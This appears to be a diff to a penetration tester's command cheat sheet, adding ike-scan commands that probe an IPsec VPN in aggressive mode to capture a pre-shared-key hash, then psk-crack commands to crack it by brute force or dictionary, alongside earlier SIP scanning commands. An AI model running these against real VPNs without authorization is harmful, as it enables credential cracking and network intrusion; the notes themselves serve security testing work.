@@ -6,6 +6,17 @@ smap -o 192.168.4.111
 SIPVICIOUS
 svmap 192.168.4.1-128
 svwar -e200-300 192.168.4.111 -m INVITE
+IKE-SCAN
+ike-scan 192.168.207.134
+ike-scan -A 192.168.207.134
+	-Aggressive
+ike-scan -A 192.168.207.134 --id=myid -P192-168-207-134key
+	-Once you have you psk file to crack you're stuck with two options psk-crack and cain
+psk-crack -b 5 192-168-207-134key
+psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
+psk-crack -d /path/to/dictionary 192-168-207-134key
+	http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html
+
 
 
 From Packet Captures
